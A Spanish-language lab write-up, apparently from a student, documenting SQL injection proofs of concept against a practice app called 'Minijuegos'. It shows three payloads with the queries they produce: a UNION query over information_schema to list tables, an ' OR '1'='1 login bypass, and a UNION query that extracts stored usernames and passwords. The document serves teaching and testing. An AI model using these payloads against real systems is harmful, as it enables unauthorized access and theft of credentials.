# Documentación de Pruebas de Inyección SQL

En este documento recojo las pruebas de concepto que he realizado sobre la aplicación "Minijuegos" para demostrar vulnerabilidades de Inyeccción SQL.

## 1. Pruebas con INFORMATION_SCHEMA

**Mi Objetivo:** Obtener información sobre la estructura de la base de datos (nombres de tablas).

**Formulario que he utilizado:** Buscador de Minijuegos (Vista `lista.php`)

**Texto que he introducido:**
```sql
' UNION SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema = 'minijuegos_db' -- 
```

**Consulta SQL que he generado:**
```sql
SELECT * FROM minijuego WHERE nombre LIKE '%' UNION SELECT null, table_name, null, null, null FROM information_schema.tables WHERE table_schema = 'minijuegos_db' -- %'
```

**Explicación de mi prueba:**
He utilizado el operador `UNION` para combinar los resultados. Como la tabla `minijuego` tiene la estructura (id, **nombre**, descripcion, ...), he colocado `table_name` en la **segunda posición** del `SELECT` para que aparezca en la columna "Nombre" de la tabla de resultados. El primer `null` corresponde al `id`.

---

## 2. Pruebas de Login (Bypass de Autenticación)

**Mi Objetivo:** Acceder al sistema sin conocer la contraseña de un usuario o acceder como el primer usuario de la base de datos (normalmente administrador).

**Formulario que he utilizado:** Inicio de Sesión (Vista `login.php`)

**Texto que he introducido (Usuario y Contraseña):**
```sql
' OR '1'='1
```

**Consulta SQL que he generado:**
```sql
SELECT * FROM usuarios WHERE usuario = '' OR '1'='1' AND password = '' OR '1'='1'
```

**Explicación de mi prueba:**
He aprovechado que la condición `'1'='1'` siempre es verdadera. Al inyectar esto en ambos campos, he conseguido que la consulta `WHERE` se evalúe como `TRUE` para todas las filas, devolviéndome generalmente el primer registro de la tabla `usuarios` y permitiéndome el acceso.

---

## 3. Pruebas de Obtención de Datos (Minijuegos)

**Mi Objetivo:** Extraer datos sensibles (usuarios y contraseñas) a través del buscador público.

**Formulario que he utilizado:** Buscador de Minijuegos (Vista `lista.php`)

**Texto que he introducido:**
```sql
' UNION SELECT null, usuario, password, null, null FROM usuarios -- 
```

**Consulta SQL que he generado:**
```sql
SELECT * FROM minijuego WHERE nombre LIKE '%' UNION SELECT null, usuario, password, null, null FROM usuarios -- %'
```

**Explicación de mi prueba:**
Similar a la prueba anterior, he ajustado el orden de las columnas. He puesto `null` para el `id`, `usuario` en la segunda posición (que se verá en la columna **Nombre** del minijuego) y `password` en la tercera (que se verá en la columna **Categoría** o descripción), para poder leer las credenciales en pantalla fácilmente.
